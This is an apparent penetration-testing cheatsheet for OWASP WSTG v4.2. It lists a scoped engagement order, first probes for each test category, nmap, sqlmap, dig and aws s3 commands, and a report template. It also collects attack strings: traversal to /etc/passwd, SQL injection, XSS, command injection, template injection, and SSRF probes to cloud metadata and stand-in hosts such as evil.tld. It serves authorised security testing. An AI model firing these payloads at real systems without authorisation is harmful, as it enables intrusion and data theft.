# Cheatsheet — OWASP WSTG v4.2

Quick-lookup card. Procedures per test in `chapters/`; methodology in `SKILL.md`; terms in `glossary.md`.

## Engagement order

1. Scope: what's in, what's banned, rate rules, test accounts.
2. INFO: dorks → metafiles → vhosts/ports → fingerprint (server, framework, CMS) → entry-point map → architecture sketch.
3. CONF: methods/HSTS/admin surfaces/backups/subdomain DNS/cloud storage.
4. IDNT+ATHN: register accounts at every role → enum probes → transport/defaults/lockout/reset.
5. ATHZ+SESS: two-session diffs → traversal → cookie audit → fixation/CSRF/logout/timeout.
6. INPV: per-entry-point injection battery (one variable at a time).
7. ERRH/CRYP: error pages → TLS/certs → padding-oracle candidates → plaintext channels.
8. BUSL: workflow map → forge/replay/skip/timing → upload abuse → misuse telemetry.
9. CLNT+APIT: source→sink tracing → CORS/framing/messaging/storage → GraphQL.
10. Report per finding: WSTG ID + impact + minimal PoC + remediation.

## Category → first probes

| Test | First move | Confirmed by |
|---|---|---|
| INFO-02 fingerprint | `curl -sI` banner + malformed request | version/server match |
| INFO-03 metafiles | fetch `robots.txt`, `sitemap.xml`, `.well-known/security.txt` | hidden paths listed |
| CONF-04 backups | `file.ext.bak/.old/~/.swp`, `.git/HEAD` | source/config returned |
| CONF-05 admin | `/admin`, `/manager/html`, alt ports | login panel / access |
| CONF-06 methods | `OPTIONS`; `PUT /test.html` then GET; junk verb `CATS` | 2xx + file retrievable; 200 vs 302 |
| CONF-10 takeover | `dig` CNAMEs → `NXDOMAIN`/SERVFAIL | provider 404 → claimable |
| CONF-11 storage | `GET` object, `PUT` test object on bucket URL | read/write succeeds |
| IDNT-04 enum | valid/bad-user vs bad-pass probes, diff response | consistent delta = oracle |
| ATHN-02 defaults | vendor default lists + `admin:admin` guess | authenticated |
| ATHN-04 bypass | deep-URL forced browse; `authenticated=1` params | protected page served |
| ATHZ-01 traversal | `../../../../etc/passwd`, `%2e%2e`, `..%c0%af`, `%00` | file content returned |
| ATHZ-04 IDOR | replay A's `?id=` request as B | B sees A's object |
| SESS-02 cookies | audit `Set-Cookie` flags | missing Secure/HttpOnly/SameSite |
| SESS-03 fixation | compare pre/post-login token | same token = fixable |
| SESS-05 CSRF | state-change req; drop/alter token, Referer | action still completes |
| INPV-01/02 XSS | `"><script>alert(1)</script>`; stored via profile/comment | unencoded exec context |
| INPV-05 SQLi | `'`, `"`, `;` → `ORDER BY n`, `OR 1=1`/`AND 1=2`, `SLEEP(5)` | error/delta/delay |
| INPV-11 include | `?file=../../etc/passwd`; `php://filter/…base64…` | file/source served |
| INPV-12 cmd inj | `;id`, `\|id`, `` `id` ``, `$(id)`, `%3B` | output/timing/OOB |
| INPV-17 host hdr | `Host: attacker.tld`, `X-Forwarded-Host:` | domain reflected/redirect/reset |
| INPV-18 SSTI | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | `49` in output |
| INPV-19 SSRF | `?url=http://OOB`, `127.0.0.1`, `169.254.169.254`, `file:///` | callback/internal data |
| ERRH-01 errors | 404/403 probes, bad types, malformed HTTP | stack trace/verbose error |
| CRYP-01 TLS | testssl/nmap `ssl-enum-ciphers`; cert SAN/expiry/alg | legacy proto/weak cert |
| CRYP-02 pad oracle | flip last bit of block-1 in b64 blob | 3 response states |
| BUSL limits | replay capped action (coupon/vote/download) | applies again |
| CLNT-07 CORS | `Origin: https://evil.tld` | ACAO reflect + credentials |
| CLNT-09 clickjack | iframe test page | loads + sensitive action |
| CLNT-11 postMsg | find `message` listener | no `event.origin` check |
| CLNT-12 storage | dump local/session/IndexedDB | tokens/PII present |
| APIT-01 GraphQL | introspection `__schema` query | schema/types returned |

## Commands

```bash
curl -sI https://target/                                  # banners, HSTS, cookie flags
curl -s -D- https://target | grep -i strict               # HSTS check
nmap -Pn -sT -sV -p0-65535 TARGET                         # non-standard ports (INFO-04)
nmap -p 443 --script http-methods --script-args http-methods.url-path='/index.php' TARGET
nmap --script ssl-enum-ciphers -p 443 TARGET              # TLS posture (CRYP-01)
dig CNAME sub.target.tld +short && dig NS target.tld +short   # takeover recon
dnsrecon -d target.tld                                    # DNS enum (CONF-10)
aws s3 ls s3://BUCKET                                     # public bucket read (CONF-11)
aws s3 cp test.txt s3://BUCKET/test.txt && aws s3 rm s3://BUCKET/test.txt   # write PoC, then clean
wfuzz -w paths.txt --hc 404 https://target/FUZZ           # dir/backup enum
sqlmap -u "https://t/?id=1" --batch --level=2 --risk=1    # confirm injectable param
```

## Probe strings that earn their keep

- Traversal: `../../../../etc/passwd`, `..%2f`, `%2e%2e%2f`, `..%c0%af`, `....//`, `file.ext%00.jpg`
- SQLi confirm: `' OR '1'='1`, `1' AND '1'='2`, `10 ORDER BY 5--`, `' UNION SELECT NULL,NULL--`, ` AND SLEEP(5)--`
- XSS contexts: `">` + `<svg onload=alert(1)>`; JS-string `';alert(1)//`; attr `"onfocus=alert(1) autofocus="`
- SSTI: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `{{config}}`, `{{self}}`
- SSRF: `http://127.0.0.1`, `http://2130706433`, `http://0177.0.0.1`, `http://127.1`, `http://169.254.169.254/latest/meta-data/`, `file:///etc/passwd`, `https://expected@evil.tld`, `https://evil.tld#expected`
- HPP: `?param=legit&param=payload` — know the platform's pick (ASP.NET joins, PHP last, JSP first)
- Header tricks: `X-Forwarded-Host:`, `X-Forwarded-For:`, `X-Original-URL:`, `X-Rewrite-URL:`, `X-HTTP-Method-Override:`

## Report skeleton

`[WSTG-XXX-NN] Title` → summary → severity (likelihood × impact) → numbered repro steps with request/response evidence → impact narrative → remediation. Per §5: include scope, limitations, timeline; mask any real user data; the consultancy template is overkill for bounty reports — keep intro/exec-summary/findings minimal.

## When stuck

- Untested category? Re-map entry points (INFO-06/07) — you probably missed a param or flow.
- Error text → framework → targeted CVEs; paths → traversal; internal hosts → SSRF.
- Old endpoints: Wayback paths, `/v1/` APIs, staging mirrors (ATHN-10).
- Two lows chain: enum + weak reset; redirect + SSRF; self-XSS + CSRF.
